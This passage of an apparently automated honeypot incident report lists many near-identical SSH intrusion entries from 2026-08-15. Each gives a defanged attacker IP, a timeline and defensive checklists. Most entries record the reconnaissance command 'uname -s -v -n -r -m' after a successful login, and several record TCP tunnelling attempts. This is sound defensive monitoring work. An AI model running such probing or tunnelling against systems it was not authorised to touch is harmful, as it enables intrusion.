| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:17` | `cowrie.session.connect` |
| `2026-08-15 05:32:17` | `cowrie.client.version` |
| `2026-08-15 05:32:17` | `cowrie.client.kex` |
| `2026-08-15 05:32:17` | `cowrie.login.success` |
| `2026-08-15 05:32:18` | `cowrie.direct-tcpip.request` |
| `2026-08-15 05:32:18` | `cowrie.direct-tcpip.data` |
| `2026-08-15 05:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fbd229d43e4

| Field | Detail |
|---|---|
| **Source IP** | `103.103.53[.]44` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:19` | `cowrie.session.connect` |
| `2026-08-15 05:32:20` | `cowrie.client.version` |
| `2026-08-15 05:32:20` | `cowrie.client.kex` |
| `2026-08-15 05:32:23` | `cowrie.login.success` |
| `2026-08-15 05:32:24` | `cowrie.direct-tcpip.request` |
| `2026-08-15 05:32:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.103.53[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.103.53[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47451e957824

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:21` | `cowrie.session.connect` |
| `2026-08-15 05:32:21` | `cowrie.client.version` |
| `2026-08-15 05:32:21` | `cowrie.client.kex` |
| `2026-08-15 05:32:22` | `cowrie.login.success` |
| `2026-08-15 05:32:23` | `cowrie.session.params` |
| `2026-08-15 05:32:23` | `cowrie.command.input` |
| `2026-08-15 05:32:23` | `cowrie.log.closed` |
| `2026-08-15 05:32:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9132c3e9a0e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:26` | `cowrie.session.connect` |
| `2026-08-15 05:32:26` | `cowrie.client.version` |
| `2026-08-15 05:32:26` | `cowrie.client.kex` |
| `2026-08-15 05:32:26` | `cowrie.login.success` |
| `2026-08-15 05:32:27` | `cowrie.session.params` |
| `2026-08-15 05:32:27` | `cowrie.command.input` |
| `2026-08-15 05:32:27` | `cowrie.log.closed` |
| `2026-08-15 05:32:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d10f8a9f9df

| Field | Detail |
|---|---|
| **Source IP** | `220.93.167[.]144` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:29` | `cowrie.session.connect` |
| `2026-08-15 05:32:31` | `cowrie.client.version` |
| `2026-08-15 05:32:31` | `cowrie.client.kex` |
| `2026-08-15 05:32:34` | `cowrie.login.success` |
| `2026-08-15 05:32:35` | `cowrie.direct-tcpip.request` |
| `2026-08-15 05:32:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.93.167[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.93.167[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31a8fb0a74f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:31` | `cowrie.session.connect` |
| `2026-08-15 05:32:31` | `cowrie.client.version` |
| `2026-08-15 05:32:31` | `cowrie.client.kex` |
| `2026-08-15 05:32:31` | `cowrie.login.success` |
| `2026-08-15 05:32:32` | `cowrie.session.params` |
| `2026-08-15 05:32:32` | `cowrie.command.input` |
| `2026-08-15 05:32:32` | `cowrie.log.closed` |
| `2026-08-15 05:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f42219e5c9a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:36` | `cowrie.session.connect` |
| `2026-08-15 05:32:36` | `cowrie.client.version` |
| `2026-08-15 05:32:36` | `cowrie.client.kex` |
| `2026-08-15 05:32:36` | `cowrie.login.success` |
| `2026-08-15 05:32:37` | `cowrie.session.params` |
| `2026-08-15 05:32:37` | `cowrie.command.input` |
| `2026-08-15 05:32:37` | `cowrie.log.closed` |
| `2026-08-15 05:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e7e5d540539

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:41` | `cowrie.session.connect` |
| `2026-08-15 05:32:41` | `cowrie.client.version` |
| `2026-08-15 05:32:41` | `cowrie.client.kex` |
| `2026-08-15 05:32:42` | `cowrie.login.success` |
| `2026-08-15 05:32:42` | `cowrie.session.params` |
| `2026-08-15 05:32:42` | `cowrie.command.input` |
| `2026-08-15 05:32:43` | `cowrie.log.closed` |
| `2026-08-15 05:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22c7b578fc51

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:46` | `cowrie.session.connect` |
| `2026-08-15 05:32:46` | `cowrie.client.version` |
| `2026-08-15 05:32:46` | `cowrie.client.kex` |
| `2026-08-15 05:32:47` | `cowrie.login.success` |
| `2026-08-15 05:32:48` | `cowrie.session.params` |
| `2026-08-15 05:32:48` | `cowrie.command.input` |
| `2026-08-15 05:32:48` | `cowrie.log.closed` |
| `2026-08-15 05:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2d5730314c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:51` | `cowrie.session.connect` |
| `2026-08-15 05:32:51` | `cowrie.client.version` |
| `2026-08-15 05:32:51` | `cowrie.client.kex` |
| `2026-08-15 05:32:52` | `cowrie.login.success` |
| `2026-08-15 05:32:52` | `cowrie.session.params` |
| `2026-08-15 05:32:52` | `cowrie.command.input` |
| `2026-08-15 05:32:53` | `cowrie.log.closed` |
| `2026-08-15 05:32:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-997ff19a12a8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:56` | `cowrie.session.connect` |
| `2026-08-15 05:32:56` | `cowrie.client.version` |
| `2026-08-15 05:32:56` | `cowrie.client.kex` |
| `2026-08-15 05:32:57` | `cowrie.login.success` |
| `2026-08-15 05:32:58` | `cowrie.session.params` |
| `2026-08-15 05:32:58` | `cowrie.command.input` |
| `2026-08-15 05:32:58` | `cowrie.log.closed` |
| `2026-08-15 05:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cef31cc074e1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:33 |
| **Last Seen** | 2026-08-15 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:33:01` | `cowrie.session.connect` |
| `2026-08-15 05:33:01` | `cowrie.client.version` |
| `2026-08-15 05:33:02` | `cowrie.client.kex` |
| `2026-08-15 05:33:02` | `cowrie.login.success` |
| `2026-08-15 05:33:03` | `cowrie.session.params` |
| `2026-08-15 05:33:03` | `cowrie.command.input` |
| `2026-08-15 05:33:03` | `cowrie.log.closed` |
| `2026-08-15 05:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7dea95e4d11

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:33 |
| **Last Seen** | 2026-08-15 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:33:07` | `cowrie.session.connect` |
| `2026-08-15 05:33:07` | `cowrie.client.version` |
| `2026-08-15 05:33:07` | `cowrie.client.kex` |
| `2026-08-15 05:33:07` | `cowrie.login.success` |
| `2026-08-15 05:33:08` | `cowrie.session.params` |
| `2026-08-15 05:33:08` | `cowrie.command.input` |
| `2026-08-15 05:33:08` | `cowrie.log.closed` |
| `2026-08-15 05:33:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bf057ee1b21

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:33 |
| **Last Seen** | 2026-08-15 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:33:12` | `cowrie.session.connect` |
| `2026-08-15 05:33:12` | `cowrie.client.version` |
| `2026-08-15 05:33:12` | `cowrie.client.kex` |
| `2026-08-15 05:33:12` | `cowrie.login.success` |
| `2026-08-15 05:33:13` | `cowrie.session.params` |
| `2026-08-15 05:33:13` | `cowrie.command.input` |
| `2026-08-15 05:33:13` | `cowrie.log.closed` |
| `2026-08-15 05:33:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d307b1cdaccf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:33 |
| **Last Seen** | 2026-08-15 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:33:17` | `cowrie.session.connect` |
| `2026-08-15 05:33:17` | `cowrie.client.version` |
| `2026-08-15 05:33:17` | `cowrie.client.kex` |
| `2026-08-15 05:33:17` | `cowrie.login.success` |
| `2026-08-15 05:33:18` | `cowrie.session.params` |
| `2026-08-15 05:33:18` | `cowrie.command.input` |
| `2026-08-15 05:33:18` | `cowrie.log.closed` |
| `2026-08-15 05:33:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4b16ad8a24f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:33 |
| **Last Seen** | 2026-08-15 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:33:22` | `cowrie.session.connect` |
| `2026-08-15 05:33:22` | `cowrie.client.version` |
| `2026-08-15 05:33:22` | `cowrie.client.kex` |
| `2026-08-15 05:33:23` | `cowrie.login.success` |
| `2026-08-15 05:33:23` | `cowrie.session.params` |
| `2026-08-15 05:33:23` | `cowrie.command.input` |
| `2026-08-15 05:33:24` | `cowrie.log.closed` |
| `2026-08-15 05:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcda3700935c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:33 |
| **Last Seen** | 2026-08-15 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:33:28` | `cowrie.session.connect` |
| `2026-08-15 05:33:28` | `cowrie.client.version` |
| `2026-08-15 05:33:28` | `cowrie.client.kex` |
| `2026-08-15 05:33:28` | `cowrie.login.success` |
| `2026-08-15 05:33:29` | `cowrie.session.params` |
| `2026-08-15 05:33:29` | `cowrie.command.input` |
| `2026-08-15 05:33:29` | `cowrie.log.closed` |
| `2026-08-15 05:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-719b746afa84

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:33 |
| **Last Seen** | 2026-08-15 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:33:33` | `cowrie.session.connect` |
| `2026-08-15 05:33:33` | `cowrie.client.version` |
| `2026-08-15 05:33:33` | `cowrie.client.kex` |
| `2026-08-15 05:33:33` | `cowrie.login.success` |
| `2026-08-15 05:33:34` | `cowrie.session.params` |
| `2026-08-15 05:33:34` | `cowrie.command.input` |
| `2026-08-15 05:33:34` | `cowrie.log.closed` |
| `2026-08-15 05:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb4c5b1bb71b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:33 |
| **Last Seen** | 2026-08-15 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:33:38` | `cowrie.session.connect` |
| `2026-08-15 05:33:38` | `cowrie.client.version` |
| `2026-08-15 05:33:38` | `cowrie.client.kex` |
| `2026-08-15 05:33:39` | `cowrie.login.success` |
| `2026-08-15 05:33:40` | `cowrie.session.params` |
| `2026-08-15 05:33:40` | `cowrie.command.input` |
| `2026-08-15 05:33:40` | `cowrie.log.closed` |
| `2026-08-15 05:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6e1d46bfb13

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:33 |
| **Last Seen** | 2026-08-15 05:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:33:43` | `cowrie.session.connect` |
| `2026-08-15 05:33:43` | `cowrie.client.version` |
| `2026-08-15 05:33:44` | `cowrie.client.kex` |
| `2026-08-15 05:33:44` | `cowrie.login.success` |
| `2026-08-15 05:33:45` | `cowrie.session.params` |
| `2026-08-15 05:33:45` | `cowrie.command.input` |
| `2026-08-15 05:33:45` | `cowrie.log.closed` |
| `2026-08-15 05:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f047e8217210

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:33 |
| **Last Seen** | 2026-08-15 05:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:33:49` | `cowrie.session.connect` |
| `2026-08-15 05:33:49` | `cowrie.client.version` |
| `2026-08-15 05:33:49` | `cowrie.client.kex` |
| `2026-08-15 05:33:50` | `cowrie.login.success` |
| `2026-08-15 05:33:51` | `cowrie.session.params` |
| `2026-08-15 05:33:51` | `cowrie.command.input` |
| `2026-08-15 05:33:51` | `cowrie.log.closed` |
| `2026-08-15 05:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-766d41bc7f7b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:33 |
| **Last Seen** | 2026-08-15 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:33:54` | `cowrie.session.connect` |
| `2026-08-15 05:33:54` | `cowrie.client.version` |
| `2026-08-15 05:33:54` | `cowrie.client.kex` |
| `2026-08-15 05:33:55` | `cowrie.login.success` |
| `2026-08-15 05:33:55` | `cowrie.session.params` |
| `2026-08-15 05:33:55` | `cowrie.command.input` |
| `2026-08-15 05:33:56` | `cowrie.log.closed` |
| `2026-08-15 05:33:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f239ff6ef01d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:33 |
| **Last Seen** | 2026-08-15 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:33:59` | `cowrie.session.connect` |
| `2026-08-15 05:33:59` | `cowrie.client.version` |
| `2026-08-15 05:33:59` | `cowrie.client.kex` |
| `2026-08-15 05:34:00` | `cowrie.login.success` |
| `2026-08-15 05:34:01` | `cowrie.session.params` |
| `2026-08-15 05:34:01` | `cowrie.command.input` |
| `2026-08-15 05:34:01` | `cowrie.log.closed` |
| `2026-08-15 05:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38e303629485

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:34 |
| **Last Seen** | 2026-08-15 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:34:05` | `cowrie.session.connect` |
| `2026-08-15 05:34:05` | `cowrie.client.version` |
| `2026-08-15 05:34:05` | `cowrie.client.kex` |
| `2026-08-15 05:34:05` | `cowrie.login.success` |
| `2026-08-15 05:34:06` | `cowrie.session.params` |
| `2026-08-15 05:34:06` | `cowrie.command.input` |
| `2026-08-15 05:34:06` | `cowrie.log.closed` |
| `2026-08-15 05:34:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09d99cc8291b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:34 |
| **Last Seen** | 2026-08-15 05:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:34:10` | `cowrie.session.connect` |
| `2026-08-15 05:34:10` | `cowrie.client.version` |
| `2026-08-15 05:34:10` | `cowrie.client.kex` |
| `2026-08-15 05:34:11` | `cowrie.login.success` |
| `2026-08-15 05:34:12` | `cowrie.session.params` |
| `2026-08-15 05:34:12` | `cowrie.command.input` |
| `2026-08-15 05:34:12` | `cowrie.log.closed` |
| `2026-08-15 05:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d66e026e987

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 05:34 |
| **Last Seen** | 2026-08-15 05:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
